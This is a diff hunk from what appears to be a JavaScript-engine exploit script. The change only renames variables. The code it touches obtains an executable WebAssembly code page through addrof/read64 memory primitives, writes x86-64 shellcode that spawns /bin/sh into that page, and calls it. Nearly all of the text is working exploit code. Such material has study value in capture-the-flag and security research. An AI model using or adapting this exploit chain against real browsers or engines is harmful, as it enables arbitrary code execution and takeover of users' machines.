@@ -95,19 +95,19 @@ var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1
 var wasmModule = new WebAssembly.Module(wasmCode);
 var wasmInstance = new WebAssembly.Instance(wasmModule);
 
-var f = wasmInstance.exports.main;
+var shellcodeFunc = wasmInstance.exports.main;
 
-var targetAddr = addrof(f);
-targetAddr = read64(targetAddr+8*3);
-targetAddr = read64(targetAddr+8*1);
-targetAddr = read64(targetAddr+8*2);
-targetAddr = read64(targetAddr+8*0x11);
-print("[+] GET Shellcode address: "+hex(targetAddr));
+var shellcodeAddr = addrof(shellcodeFunc);
+shellcodeAddr = read64(shellcodeAddr+8*3);
+shellcodeAddr = read64(shellcodeAddr+8*1);
+shellcodeAddr = read64(shellcodeAddr+8*2);
+shellcodeAddr = read64(shellcodeAddr+8*0x11);
+print("[+] GET Shellcode address: "+hex(shellcodeAddr));
 
 shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";
 
-injectShellcode(targetAddr, shellcode);
+injectShellcode(shellcodeAddr, shellcode);
 
 print("[+] Shellcode injected!");
 
-f();
+shellcodeFunc();
